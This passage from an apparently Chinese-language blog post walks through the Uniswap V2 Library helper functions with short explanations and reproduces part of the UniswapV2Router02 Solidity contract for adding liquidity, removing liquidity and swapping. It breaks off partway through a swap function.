&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Analyse-2"><a href="#Analyse-2" class="headerlink" title="Analyse"></a>Analyse</h2><p>就是一个库函数而已，里面有一些有用的函数</p><h2 id="sortTokens-address-tokenA-address-tokenB"><a href="#sortTokens-address-tokenA-address-tokenB" class="headerlink" title="sortTokens(address tokenA,address tokenB)"></a>sortTokens(address tokenA,address tokenB)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) &#123;</span><br><span class="line">    require(tokenA != tokenB, &#x27;UniswapV2Library: IDENTICAL_ADDRESSES&#x27;);</span><br><span class="line">    (token0, token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA);</span><br><span class="line">    require(token0 != address(0), &#x27;UniswapV2Library: ZERO_ADDRESS&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将tokenA,B从小到大排序，要求tokenA!&#x3D;tokenB,且不能是address(0)</p><h2 id="pairFor-address-factory-address-tokenA-address-tokenB"><a href="#pairFor-address-factory-address-tokenA-address-tokenB" class="headerlink" title="pairFor(address factory, address tokenA, address tokenB)"></a>pairFor(address factory, address tokenA, address tokenB)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) &#123;</span><br><span class="line">    (address token0, address token1) = sortTokens(tokenA, tokenB);</span><br><span class="line">    pair = address(uint(keccak256(abi.encodePacked(</span><br><span class="line">            hex&#x27;ff&#x27;,</span><br><span class="line">            factory,</span><br><span class="line">            keccak256(abi.encodePacked(token0, token1)),</span><br><span class="line">            hex&#x27;96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f&#x27; // init code hash</span><br><span class="line">        ))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>寻找到factory合约中对应tokenA,B的pair合约地址</p><h2 id="getReserves-address-factory-address-tokenA-address-tokenB"><a href="#getReserves-address-factory-address-tokenA-address-tokenB" class="headerlink" title="getReserves(address factory, address tokenA, address tokenB)"></a>getReserves(address factory, address tokenA, address tokenB)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function getReserves(address factory, address tokenA, address tokenB) internal view returns (uint reserveA, uint reserveB) &#123;</span><br><span class="line">    (address token0,) = sortTokens(tokenA, tokenB);</span><br><span class="line">    (uint reserve0, uint reserve1,) = IUniswapV2Pair(pairFor(factory, tokenA, tokenB)).getReserves();</span><br><span class="line">    (reserveA, reserveB) = tokenA == token0 ? (reserve0, reserve1) : (reserve1, reserve0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用于得到对应pair合约中的tokenA,B的储蓄金</p><h2 id="quote-uint-amountA-uint-reserveA-uint-reserveB"><a href="#quote-uint-amountA-uint-reserveA-uint-reserveB" class="headerlink" title="quote(uint amountA, uint reserveA, uint reserveB)"></a>quote(uint amountA, uint reserveA, uint reserveB)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function quote(uint amountA, uint reserveA, uint reserveB) internal pure returns (uint amountB) &#123;</span><br><span class="line">    require(amountA &gt; 0, &#x27;UniswapV2Library: INSUFFICIENT_AMOUNT&#x27;);</span><br><span class="line">    require(reserveA &gt; 0 &amp;&amp; reserveB &gt; 0, &#x27;UniswapV2Library: INSUFFICIENT_LIQUIDITY&#x27;);</span><br><span class="line">    amountB = amountA.mul(reserveB) / reserveA;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用于计算出与储蓄金等比例的amountB</p><h2 id="getAmountOut-uint-amountIn-uint-reserveIn-uint-reserveOut"><a href="#getAmountOut-uint-amountIn-uint-reserveIn-uint-reserveOut" class="headerlink" title="getAmountOut(uint amountIn, uint reserveIn, uint reserveOut)"></a>getAmountOut(uint amountIn, uint reserveIn, uint reserveOut)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) internal pure returns (uint amountOut) &#123;</span><br><span class="line">        require(amountIn &gt; 0, &#x27;UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT&#x27;);</span><br><span class="line">        require(reserveIn &gt; 0 &amp;&amp; reserveOut &gt; 0, &#x27;UniswapV2Library: INSUFFICIENT_LIQUIDITY&#x27;);</span><br><span class="line">        uint amountInWithFee = amountIn.mul(997);</span><br><span class="line">        uint numerator = amountInWithFee.mul(reserveOut);</span><br><span class="line">        uint denominator = reserveIn.mul(1000).add(amountInWithFee);</span><br><span class="line">        amountOut = numerator / denominator;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>用来得到amountIn数量的token可以换取另一种token的数量</p><h2 id="getAmountIn-uint-amountOut-uint-reserveIn-uint-reserveOut"><a href="#getAmountIn-uint-amountOut-uint-reserveIn-uint-reserveOut" class="headerlink" title="getAmountIn(uint amountOut, uint reserveIn, uint reserveOut)"></a>getAmountIn(uint amountOut, uint reserveIn, uint reserveOut)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) internal pure returns (uint amountIn) &#123;</span><br><span class="line">    require(amountOut &gt; 0, &#x27;UniswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT&#x27;);</span><br><span class="line">    require(reserveIn &gt; 0 &amp;&amp; reserveOut &gt; 0, &#x27;UniswapV2Library: INSUFFICIENT_LIQUIDITY&#x27;);</span><br><span class="line">    uint numerator = reserveIn.mul(amountOut).mul(1000);</span><br><span class="line">    uint denominator = reserveOut.sub(amountOut).mul(997);</span><br><span class="line">    amountIn = (numerator / denominator).add(1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用来计算amountOut数量的token需要多少amountIn的token数量</p><h2 id="getAmountsOut-address-factory-uint-amountIn-address-memory-path"><a href="#getAmountsOut-address-factory-uint-amountIn-address-memory-path" class="headerlink" title="getAmountsOut(address factory, uint amountIn, address[] memory path)"></a>getAmountsOut(address factory, uint amountIn, address[] memory path)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function getAmountsOut(address factory, uint amountIn, address[] memory path) internal view returns (uint[] memory amounts) &#123;</span><br><span class="line">    require(path.length &gt;= 2, &#x27;UniswapV2Library: INVALID_PATH&#x27;);</span><br><span class="line">    amounts = new uint[](path.length);</span><br><span class="line">    amounts[0] = amountIn;</span><br><span class="line">    for (uint i; i &lt; path.length - 1; i++) &#123;</span><br><span class="line">        (uint reserveIn, uint reserveOut) = getReserves(factory, path[i], path[i + 1]);</span><br><span class="line">        amounts[i + 1] = getAmountOut(amounts[i], reserveIn, reserveOut);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用于token0-&gt;token1-&gt;token2-&gt;token3-&gt;…….等连续交换，用amountIn数量的token来连续交换，并将每次能换出的数量进行储存，进行n次交换，并返回按路径交换的各次数量的数组</p><h1 id="UniswapV2Router02"><a href="#UniswapV2Router02" class="headerlink" title="UniswapV2Router02"></a>UniswapV2Router02</h1><h2 id="Code-4"><a href="#Code-4" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br></pre></td><td class="code"><pre><span class="line">contract UniswapV2Router02 is IUniswapV2Router02 &#123;</span><br><span class="line">    using SafeMath for uint;</span><br><span class="line"></span><br><span class="line">    address public immutable override factory;</span><br><span class="line">    address public immutable override WETH;</span><br><span class="line"></span><br><span class="line">    modifier ensure(uint deadline) &#123;</span><br><span class="line">        require(deadline &gt;= block.timestamp, &#x27;UniswapV2Router: EXPIRED&#x27;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor(address _factory, address _WETH) public &#123;</span><br><span class="line">        factory = _factory;</span><br><span class="line">        WETH = _WETH;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        assert(msg.sender == WETH); // only accept ETH via fallback from the WETH contract</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // **** ADD LIQUIDITY ****</span><br><span class="line">    function _addLiquidity(</span><br><span class="line">        address tokenA,</span><br><span class="line">        address tokenB,</span><br><span class="line">        uint amountADesired,</span><br><span class="line">        uint amountBDesired,</span><br><span class="line">        uint amountAMin,</span><br><span class="line">        uint amountBMin</span><br><span class="line">    ) internal virtual returns (uint amountA, uint amountB) &#123;</span><br><span class="line">        // create the pair if it doesn&#x27;t exist yet</span><br><span class="line">        if (IUniswapV2Factory(factory).getPair(tokenA, tokenB) == address(0)) &#123;</span><br><span class="line">            IUniswapV2Factory(factory).createPair(tokenA, tokenB);</span><br><span class="line">        &#125;</span><br><span class="line">        (uint reserveA, uint reserveB) = UniswapV2Library.getReserves(factory, tokenA, tokenB);</span><br><span class="line">        if (reserveA == 0 &amp;&amp; reserveB == 0) &#123;</span><br><span class="line">            (amountA, amountB) = (amountADesired, amountBDesired);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            uint amountBOptimal = UniswapV2Library.quote(amountADesired, reserveA, reserveB);</span><br><span class="line">            if (amountBOptimal &lt;= amountBDesired) &#123;</span><br><span class="line">                require(amountBOptimal &gt;= amountBMin, &#x27;UniswapV2Router: INSUFFICIENT_B_AMOUNT&#x27;);</span><br><span class="line">                (amountA, amountB) = (amountADesired, amountBOptimal);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                uint amountAOptimal = UniswapV2Library.quote(amountBDesired, reserveB, reserveA);</span><br><span class="line">                assert(amountAOptimal &lt;= amountADesired);</span><br><span class="line">                require(amountAOptimal &gt;= amountAMin, &#x27;UniswapV2Router: INSUFFICIENT_A_AMOUNT&#x27;);</span><br><span class="line">                (amountA, amountB) = (amountAOptimal, amountBDesired);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function addLiquidity(</span><br><span class="line">        address tokenA,</span><br><span class="line">        address tokenB,</span><br><span class="line">        uint amountADesired,</span><br><span class="line">        uint amountBDesired,</span><br><span class="line">        uint amountAMin,</span><br><span class="line">        uint amountBMin,</span><br><span class="line">        address to,</span><br><span class="line">        uint deadline</span><br><span class="line">    ) external virtual override ensure(deadline) returns (uint amountA, uint amountB, uint liquidity) &#123;</span><br><span class="line">        (amountA, amountB) = _addLiquidity(tokenA, tokenB, amountADesired, amountBDesired, amountAMin, amountBMin);</span><br><span class="line">        address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);</span><br><span class="line">        TransferHelper.safeTransferFrom(tokenA, msg.sender, pair, amountA);</span><br><span class="line">        TransferHelper.safeTransferFrom(tokenB, msg.sender, pair, amountB);</span><br><span class="line">        liquidity = IUniswapV2Pair(pair).mint(to);</span><br><span class="line">    &#125;</span><br><span class="line">    function addLiquidityETH(</span><br><span class="line">        address token,</span><br><span class="line">        uint amountTokenDesired,</span><br><span class="line">        uint amountTokenMin,</span><br><span class="line">        uint amountETHMin,</span><br><span class="line">        address to,</span><br><span class="line">        uint deadline</span><br><span class="line">    ) external virtual override payable ensure(deadline) returns (uint amountToken, uint amountETH, uint liquidity) &#123;</span><br><span class="line">        (amountToken, amountETH) = _addLiquidity(</span><br><span class="line">            token,</span><br><span class="line">            WETH,</span><br><span class="line">            amountTokenDesired,</span><br><span class="line">            msg.value,</span><br><span class="line">            amountTokenMin,</span><br><span class="line">            amountETHMin</span><br><span class="line">        );</span><br><span class="line">        address pair = UniswapV2Library.pairFor(factory, token, WETH);</span><br><span class="line">        TransferHelper.safeTransferFrom(token, msg.sender, pair, amountToken);</span><br><span class="line">        IWETH(WETH).deposit&#123;value: amountETH&#125;();</span><br><span class="line">        assert(IWETH(WETH).transfer(pair, amountETH));</span><br><span class="line">        liquidity = IUniswapV2Pair(pair).mint(to);</span><br><span class="line">        // refund dust eth, if any</span><br><span class="line">        if (msg.value &gt; amountETH) TransferHelper.safeTransferETH(msg.sender, msg.value - amountETH);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // **** REMOVE LIQUIDITY ****</span><br><span class="line">    function removeLiquidity(</span><br><span class="line">        address tokenA,</span><br><span class="line">        address tokenB,</span><br><span class="line">        uint liquidity,</span><br><span class="line">        uint amountAMin,</span><br><span class="line">        uint amountBMin,</span><br><span class="line">        address to,</span><br><span class="line">        uint deadline</span><br><span class="line">    ) public virtual override ensure(deadline) returns (uint amountA, uint amountB) &#123;</span><br><span class="line">        address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);</span><br><span class="line">        IUniswapV2Pair(pair).transferFrom(msg.sender, pair, liquidity); // send liquidity to pair</span><br><span class="line">        (uint amount0, uint amount1) = IUniswapV2Pair(pair).burn(to);</span><br><span class="line">        (address token0,) = UniswapV2Library.sortTokens(tokenA, tokenB);</span><br><span class="line">        (amountA, amountB) = tokenA == token0 ? (amount0, amount1) : (amount1, amount0);</span><br><span class="line">        require(amountA &gt;= amountAMin, &#x27;UniswapV2Router: INSUFFICIENT_A_AMOUNT&#x27;);</span><br><span class="line">        require(amountB &gt;= amountBMin, &#x27;UniswapV2Router: INSUFFICIENT_B_AMOUNT&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    function removeLiquidityETH(</span><br><span class="line">        address token,</span><br><span class="line">        uint liquidity,</span><br><span class="line">        uint amountTokenMin,</span><br><span class="line">        uint amountETHMin,</span><br><span class="line">        address to,</span><br><span class="line">        uint deadline</span><br><span class="line">    ) public virtual override ensure(deadline) returns (uint amountToken, uint amountETH) &#123;</span><br><span class="line">        (amountToken, amountETH) = removeLiquidity(</span><br><span class="line">            token,</span><br><span class="line">            WETH,</span><br><span class="line">            liquidity,</span><br><span class="line">            amountTokenMin,</span><br><span class="line">            amountETHMin,</span><br><span class="line">            address(this),</span><br><span class="line">            deadline</span><br><span class="line">        );</span><br><span class="line">        TransferHelper.safeTransfer(token, to, amountToken);</span><br><span class="line">        IWETH(WETH).withdraw(amountETH);</span><br><span class="line">        TransferHelper.safeTransferETH(to, amountETH);</span><br><span class="line">    &#125;</span><br><span class="line">    function removeLiquidityWithPermit(</span><br><span class="line">        address tokenA,</span><br><span class="line">        address tokenB,</span><br><span class="line">        uint liquidity,</span><br><span class="line">        uint amountAMin,</span><br><span class="line">        uint amountBMin,</span><br><span class="line">        address to,</span><br><span class="line">        uint deadline,</span><br><span class="line">        bool approveMax, uint8 v, bytes32 r, bytes32 s</span><br><span class="line">    ) external virtual override returns (uint amountA, uint amountB) &#123;</span><br><span class="line">        address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);</span><br><span class="line">        uint value = approveMax ? uint(-1) : liquidity;</span><br><span class="line">        IUniswapV2Pair(pair).permit(msg.sender, address(this), value, deadline, v, r, s);</span><br><span class="line">        (amountA, amountB) = removeLiquidity(tokenA, tokenB, liquidity, amountAMin, amountBMin, to, deadline);</span><br><span class="line">    &#125;</span><br><span class="line">    function removeLiquidityETHWithPermit(</span><br><span class="line">        address token,</span><br><span class="line">        uint liquidity,</span><br><span class="line">        uint amountTokenMin,</span><br><span class="line">        uint amountETHMin,</span><br><span class="line">        address to,</span><br><span class="line">        uint deadline,</span><br><span class="line">        bool approveMax, uint8 v, bytes32 r, bytes32 s</span><br><span class="line">    ) external virtual override returns (uint amountToken, uint amountETH) &#123;</span><br><span class="line">        address pair = UniswapV2Library.pairFor(factory, token, WETH);</span><br><span class="line">        uint value = approveMax ? uint(-1) : liquidity;</span><br><span class="line">        IUniswapV2Pair(pair).permit(msg.sender, address(this), value, deadline, v, r, s);</span><br><span class="line">        (amountToken, amountETH) = removeLiquidityETH(token, liquidity, amountTokenMin, amountETHMin, to, deadline);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // **** REMOVE LIQUIDITY (supporting fee-on-transfer tokens) ****</span><br><span class="line">    function removeLiquidityETHSupportingFeeOnTransferTokens(</span><br><span class="line">        address token,</span><br><span class="line">        uint liquidity,</span><br><span class="line">        uint amountTokenMin,</span><br><span class="line">        uint amountETHMin,</span><br><span class="line">        address to,</span><br><span class="line">        uint deadline</span><br><span class="line">    ) public virtual override ensure(deadline) returns (uint amountETH) &#123;</span><br><span class="line">        (, amountETH) = removeLiquidity(</span><br><span class="line">            token,</span><br><span class="line">            WETH,</span><br><span class="line">            liquidity,</span><br><span class="line">            amountTokenMin,</span><br><span class="line">            amountETHMin,</span><br><span class="line">            address(this),</span><br><span class="line">            deadline</span><br><span class="line">        );</span><br><span class="line">        TransferHelper.safeTransfer(token, to, IERC20(token).balanceOf(address(this)));</span><br><span class="line">        IWETH(WETH).withdraw(amountETH);</span><br><span class="line">        TransferHelper.safeTransferETH(to, amountETH);</span><br><span class="line">    &#125;</span><br><span class="line">    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(</span><br><span class="line">        address token,</span><br><span class="line">        uint liquidity,</span><br><span class="line">        uint amountTokenMin,</span><br><span class="line">        uint amountETHMin,</span><br><span class="line">        address to,</span><br><span class="line">        uint deadline,</span><br><span class="line">        bool approveMax, uint8 v, bytes32 r, bytes32 s</span><br><span class="line">    ) external virtual override returns (uint amountETH) &#123;</span><br><span class="line">        address pair = UniswapV2Library.pairFor(factory, token, WETH);</span><br><span class="line">        uint value = approveMax ? uint(-1) : liquidity;</span><br><span class="line">        IUniswapV2Pair(pair).permit(msg.sender, address(this), value, deadline, v, r, s);</span><br><span class="line">        amountETH = removeLiquidityETHSupportingFeeOnTransferTokens(</span><br><span class="line">            token, liquidity, amountTokenMin, amountETHMin, to, deadline</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // **** SWAP ****</span><br><span class="line">    // requires the initial amount to have already been sent to the first pair</span><br><span class="line">    function _swap(uint[] memory amounts, address[] memory path, address _to) internal virtual &#123;</span><br><span class="line">        for (uint i; i &lt; path.length - 1; i++) &#123;</span><br><span class="line">            (address input, address output) = (path[i], path[i + 1]);</span><br><span class="line">            (address token0,) = UniswapV2Library.sortTokens(input, output);</span><br><span class="line">            uint amountOut = amounts[i + 1];</span><br><span class="line">            (uint amount0Out, uint amount1Out) = input == token0 ? (uint(0), amountOut) : (amountOut, uint(0));</span><br><span class="line">            address to = i &lt; path.length - 2 ? UniswapV2Library.pairFor(factory, output, path[i + 2]) : _to;</span><br><span class="line">            IUniswapV2Pair(UniswapV2Library.pairFor(factory, input, output)).swap(</span><br><span class="line">                amount0Out, amount1Out, to, new bytes(0)</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function swapExactTokensForTokens(</span><br><span class="line">        uint amountIn,</span><br><span class="line">        uint amountOutMin,</span><br><span class="line">        address[] calldata path,</span><br><span class="line">        address to,</span><br><span class="line">        uint deadline</span><br><span class="line">    ) external virtual override ensure(deadline) returns (uint[] memory amounts) &#123;</span><br><span class="line">        amounts = 